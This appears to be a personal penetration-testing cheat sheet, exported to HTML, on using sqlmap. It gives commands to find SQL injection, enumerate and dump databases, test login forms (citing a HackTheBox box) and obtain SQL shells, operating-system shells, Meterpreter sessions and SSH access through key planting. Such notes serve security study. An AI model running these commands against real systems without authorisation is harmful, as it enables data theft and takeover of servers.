<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>sqlmap</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># SQL Injection - sqlmap</h1></strong><br /><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a><br />sqlmap is an automated tool that will find and exploit SQL injection vulnerabilities.<br />For the most part it tests URL parameters. If you want to test login forms it&#39;s a little different.<br /><br /><strong>Parameters</strong><br /><code>--batch</code> - dont&#39; ask me questions (just always choose what&#39;s default)<br /><code>--risk=3</code> - highest level of risk is 3<br /><code>--level=5</code> - level of testting to do (highest is 5)<br /><code>--mobile</code> - use a mobile user agent<br /><br /><strong><h2>## Basic Usage</h2></strong><br /><code>sqlmap -u http://url.com/gallery.php?id=1</code> - Test a URL<br /><br /><code>-D</code> databse_name<br /><code>-T</code> table_name<br /><code>-C</code> column_name<br /><br /><code>sqlmap -u http://url.com/gallery.php?id=1 --dbs</code> - Extract database names<br /><code>sqlmap -u http://url.com/gallery.php?id=1 --tables</code> - Extrace all tables from every database<br /><code>sqlmap -u http://url.com/gallery.php?id=1 --columns</code> - Extract all columns from every table in all databases<br /><br /><code>sqlmap -u http://url.com/gallery.php?id=1 -D database2 --tables</code> - Extract all tables from database2<br /><code>sqlmap -u http://url.com/gallery.php?id=1 -D database2 -T table3 --columns</code> - Extract all columns from database2 table3<br /><br />To retrieve/download things, use --dump<br /><code>sqlmap -u http://url.com/gallery.php?id=1 -D database2 -T usernames --dump</code><br /><br /><strong><h2>## Crawl a site for SQL injections</h2></strong><br /><code>--batch</code> = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers<br /><code>--crawl</code> = how deep you want to crawl a site<br /><code>--forms</code> = Parse and test forms<br /><br /><code>sqlmap -u &quot;http://example.com/&quot; --crawl=3 --random-agent --batch --forms --threads=5 --level=5 --risk=3</code><br /><br /><strong><h2>## Testing Login Forms</h2></strong><br />Testing login forms is slightly different. <br />You have to provide sqlmap with URL of the login and the parameters submitted during login.<br />To find the login parameters, just log in normally and watch the parameters in something like Burp or chrome/firefox developer tools.<br /><br /><code>sqlmap -u http://url.com/login.php --data=&quot;username=john&amp;password=smile&amp;Submit=Login&quot; --method POST --dbs</code><br /><br /><strong><h3>### Boolean Testing</h3></strong><br />If you notice an error message when logging, you can provide it to sqlmap with <code>--string</code><br />This error message can then be used for boolean testing (i.e. if string present, injection failed. if string not present, injection succeeded).<br /><br /><code>--string</code> might make the difference between finding an injection or not.<br /><br />Examples:<br />• <em>hackthebox Falafel</em><br /><br /><code>sqlmap -r login.request -p username,password --level 5 --risk 3 --string &quot;Wrong identification&quot; --batch</code><br /><br /><strong><h2>## Get a shell</h2></strong><br />SQL Shell<br /><code>sqlmap -u &quot;http://example.com/?id=1&quot;  -p id --sql-shell</code><br /><br />Execute an operating system command<br /><code>sqlmap -u &quot;http://example.com/?id=1&quot; -p id --os-cmd=OSCMD</code><br /><br />An interactive operating system shell<br /><code>sqlmap-u &quot;http://example.com/?id=1&quot;  -p id --os-shell</code><br /><br />An OOB shell, Meterpreter or VNC<br /><code>sqlmap -u &quot;http://example.com/?id=1&quot;  -p id --os-pwn</code><br /><br />SSH Shell by dropping an SSH key<br /><code>sqlmap -u &quot;http://example.com/?id=1&quot; -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/</code><br /><br /><strong><h2>## Injecting into Body Data</h2></strong><br /><a href="https://hackertarget.com/sqlmap-post-request-injection/">https://hackertarget.com/sqlmap-post-request-injection/</a><br />If you&#39;re injecting into parameters submitted in the body, you can provide copy of the request to sqlmap with <code>-r</code><br /><br />• Capture the login request in Burp, right click &gt; copy to file, then point sqlmap to the request file with <code>-r</code><br />   ◇ The POST request mustn&#39;t end with a newline <code>\n</code> character<br />   ◇ If it does, sqlmap won&#39;t parse all the body parameters correctly<br />   ◇ Right click &gt; copy to file is the easiest way to save the request without a newline character<br /><br />• <code>-r</code> to specify request file<br />• <code>-p</code> to specify parameters to test<br />   ◇ not specifying any parameters will test all the parameters in the body<br />   ◇ not specifying any parameters + <code>--level 5</code> and <code>--risk 3</code> will test <em>every</em> parameter in the request e.g. cookie, header etc.<br /><br /><code>sqlmap -r postrequest.txt -p password</code><br /><code>sqlmap -r postrequest.txt -p username,password</code><br /><code>sqlmap -r postrequest.txt -p username,password --level 5 --risk 3 --batch</code><br /><br /><strong><h2>## Passing Authentication</h2></strong><br />If the URL isn&#39;t accessible because you need to be authenticated to access it, you can pass cookie data or authentication credentials to SQLmap by pasting the post request in a file and using the -r option:<br /><code>sqlmap -r request.txt</code><br /><br />If you just need to pass a cookie:<br /><code>sqlmap -u &quot;http://url.com/gallery.php?id=1&quot; --cookie &quot;PHPSESSID=foobar&quot;</code><br /><br /><strong><h2>## Direct Connect to Database</h2></strong><br />The database is running on a port not a web service and you want to directly connect to it/query it.<br />I&#39;ve used this before with mssql on port 1433.<br /><br /><strong><h3>### Port 1433 - MSSQL</h3></strong><br /><a href="https://sourceforge.net/p/sqlmap/mailman/message/30733472/">https://sourceforge.net/p/sqlmap/mailman/message/30733472/</a><br /><code>sqlmap -d &#39;mssql://bob:password@10.10.10.125:1433/database_name&#39; -v 3 --os=Windows --dbs</code><br /><br />Direct connect to ms-sql database on port 1433 using windows authentition:<br />(you put the domain name in first)<br /><code>sqlmap -d &#39;mssql://DOMAIN\bob:password@10.10.10.125:1433/database_name&#39; -v 3 --os=Windows --dbs</code><br /></div>
</body>
</html>
